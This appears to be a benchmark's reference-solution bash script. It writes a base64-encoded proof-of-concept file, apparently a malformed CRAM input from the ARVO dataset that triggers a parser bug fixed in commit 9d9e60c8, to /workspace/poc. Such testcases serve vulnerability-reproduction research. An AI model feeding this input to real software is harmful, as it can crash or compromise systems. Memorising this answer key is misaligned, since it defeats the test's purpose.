#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 9d9e60c8 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
Q1JBTQIAAAAL/x4A/38gAAEAJiYmJk/vBR0AQFNgACAJAAd0LQgAAAD/AAAALT0jX0AIXl1dXVmwI0kcAQAAAIp/UyMjBGkAAUBTUQlRUVFRUfr6AQAAAAAAIxB1dVWKioogQAqAAAAATE46NTM4OP/////8ef///0BTUQn/Lg44NgAAEABQT9NTPSjR/woBCQajtbUJCQ==
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
